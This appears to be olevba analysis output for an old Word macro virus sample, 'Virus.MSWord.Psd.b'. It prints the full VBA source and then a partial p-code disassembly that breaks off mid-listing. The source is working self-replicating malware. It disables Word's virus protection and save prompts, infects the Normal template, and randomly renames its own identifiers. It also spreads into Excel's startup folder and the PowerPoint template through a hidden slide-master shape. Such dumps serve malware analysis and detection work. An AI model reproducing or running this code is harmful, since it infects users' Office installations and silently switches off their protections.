olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Psd.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Psd.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For BK2334 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BK2334: End If
FQ6228 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
DS914 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PG472 = ActiveDocument.VBProject.VBComponents.Item(1)
BA1137 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PG472 = NormalTemplate.VBProject.VBComponents.Item(1)
KR3948 = True
Call FE2767_MM4188
ActiveDocument.Saved = True
End If
If KR3948 <> True And BA1137 <> True Then GoTo AS1354
If KR3948 = True Then PG472.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FQ6228 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If BA1137 = True Then PG472.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DS914 - 4))
AS1354:
If DS914 <> 0 And FQ6228 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function FE2767_MM4188()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "NI9995": r1(2) = "MB6331": r1(3) = "UA1599": r1(4) = "JG3931": r1(5) = "MM4188": r1(6) = "FQ6228"
r1(7) = "DS914": r1(8) = "BA1137":: r1(9) = "PG472": r1(10) = "KR3948": r1(11) = "AS1354": r1(12) = "FE2767": r1(13) = "JF7398": r1(14) = "RO3373": r1(15) = "BK2334"
For BK2334 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call MM4188(a1, r1(BK2334))
Next BK2334
End Function 'VAMP v1.0 [thanks Vic!]
Private Function MM4188(RO3373, JF7398 As String)
On Error Resume Next
Dim NI9995 As Long: Dim MB6331 As Long: Dim UA1599 As Long: Dim JG3931 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NI9995 = 1: MB6331 = 1: UA1599 = .CountOfLines: JG3931 = Len(.Lines(.CountOfLines, 1))
Do While .Find(JF7398, NI9995, MB6331, UA1599, JG3931, True)
strline = .Lines(NI9995, 1)
strline = Left(strline, MB6331 - 1) & RO3373 & Mid(strline, JG3931)
.replaceline NI9995, strline
NI9995 = UA1599 + 1: MB6331 = 1:
UA1599 = .CountOfLines
JG3931 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
            NewMod.CodeModule.replaceline 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountOfLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
            NT.replaceline 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.replaceline 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Psd.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12411 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld BK2334 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #5:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #7:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #8:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld BK2334 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St FQ6228 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DS914 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PG472 
' Line #13:
' 	LitVarSpecial (True)
' 	St BA1137 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PG472 
' Line #17:
' 	LitVarSpecial (True)
' 	St KR3948 
' Line #18:
' 	ArgsCall (Call) FE2767_MM4188 0x0000 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld KR3948 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld BA1137 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo AS1354 
' 	EndIf 
' Line #22:
' 	Ld KR3948 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld FQ6228 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "Application.Quit SaveChanges:=wdDoNotSaveChanges"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld PG472 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #23:
' 	Ld BA1137 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld DS914 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld PG472 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #24:
' 	Label AS1354 
' Line #25:
' 	Ld DS914 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld FQ6228 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' 	QuoteRem 0x0008 0x003F "W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]"
' Line #30:
' 	FuncDefn (Private Function FE2767_MM4188(id_FFFE As Variant))
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	ArgsCall Read 0x0000 
' Line #33:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	VarDefn r1 (As String)
' Line #34:
' 	LitStr 0x0006 "NI9995"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "MB6331"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "UA1599"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "JG3931"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "MM4188"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FQ6228"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #35:
' 	LitStr 0x0005 "DS914"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BA1137"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0005 "PG472"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KR3948"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AS1354"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FE2767"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "JF7398"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RO3373"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BK2334"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld BK2334 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #37:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #38:
' 	Ld a1 
' 	Ld BK2334 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) MM4188 0x0002 
' Line #39:
' 	StartForVariable 
' 	Ld BK2334 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #41:
' 	FuncDefn (Private Function MM4188(RO3373, JF7398 As String, id_FFFE As Variant))
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	Dim 
' 	VarDefn NI9995 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn MB6331 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn UA1599 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn JG3931 (As Long)
' Line #44:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #45:
' 	LitDI2 0x0001 
' 	St NI9995 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MB6331 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St UA1599 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St JG3931 
' Line #46:
' 	Ld JF7398 
' 	Ld NI9995 
' 	Ld MB6331 
' 	Ld UA1599 
' 	Ld JG3931 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #47:
' 	Ld NI9995 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #48:
' 	Ld strline 
' 	Ld MB6331 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld RO3373 
' 	Concat 
' 	Ld strline 
' 	Ld JG3931 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #49:
' 	Ld NI9995 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #50:
' 	Ld UA1599 
' 	LitDI2 0x0001 
' 	Add 
' 	St NI9995 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St MB6331 
' 	BoS 0x0000 
' Line #51:
' 	MemLdWith CountOfLines 
' 	St UA1599 
' Line #52:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St JG3931 
' Line #53:
' 	Loop 
' Line #54:
' 	EndWith 
' Line #55:
' 	EndFunc 
' Line #56:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AW 
' Line #59:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set TW 
' Line #60:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	IfBlock 
' Line #61:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #62:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #63:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #64:
' 	LitVarSpecial (True)
' 	St WQuit 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #68:
' 	LitDI2 0x0001 
' 	LitStr 0x0016 "Public Sub DisableAV()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	LitDI2 0x0003 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	LitDI2 0x0003 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #69:
' 	LitStr 0x001D "Normal.ThisDocument.DisableAV"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #71:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #72:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #73:
' 	Ld WQuit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #74:
' 	SetStmt 
' 	LitStr 0x0016 "PowerPoint.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set PPObj 
' Line #75:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0024 "\..\Templates\Blank Presentation.pot"
' 	Add 
' 	ParamOmitted 
' 	ParamOmitted 
' 	Ld msoFalse 
' 	Ld PPObj 
' 	MemLd Presentations 
' 	ArgsMemLd Option 0x0004 
' 	Set PBT 
' Line #76:
' 	StartForVariable 
' 	Ld ModComponent 
' 	EndForVariable 
' 	Ld PBT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #77:
' 	Ld ModComponent 
' 	MemLd New 
' 	LitStr 0x000A "Triplicate"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St dontadd 
' 	EndIf 
' Line #78:
' 	StartForVariable 
' 	Next 
' Line #79:
' 	Ld dontadd 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #80:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld PBT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set NewMod 
' Line #81:
' 	LitStr 0x000A "Triplicate"
' 	Ld NewMod 
' 	MemSt New 
' Line #82:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NewMod 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitDI2 0x0076 
' 	LitStr 0x0018 "Sub actionhook(tristate)"
' 	Ld NewMod 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #84:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld PBT 
' 	MemLd PageSetup 
' 	MemLd SlideWidth 
' 	Ld PBT 
' 	MemLd PageSetup 
' 	MemLd SlideHeight 
' 	Ld PBT 
' 	MemLd SlideMaster 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set ShapetoWack 
' Line #85:
' 	StartWithExpr 
' 	Ld ShapetoWack 
' 	With 
' Line #86:
' 	LitStr 0x000A "Triplicate"
' 	MemStWith New 
' Line #87:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #88:
' 	LitVarSpecial (False)
' 	MemLdWith Like 
' 	MemSt Visible 
' Line #89:
' 	LitVarSpecial (False)
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #90:
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Action 
' Line #91:
' 	LitStr 0x000A "actionhook"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Run 
' Line #92:
' 	EndWith 
' Line #93:
' 	SetStmt 
' 	LitNothing 
' 	Set NewMod 
' Line #94:
' 	Ld PBT 
' 	ArgsMemCall Save 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	Ld PBT 
' 	ArgsMemCall Close 0x0000 
' Line #97:
' 	Ld PPObj 
' 	ArgsMemCall Quit 0x0000 
' Line #98:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlApp 
' Line #99:
' 	SetStmt 
' 	Ld xlApp 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set Book1Obj 
' Line #100:
' 	LitDI2 0x0001 
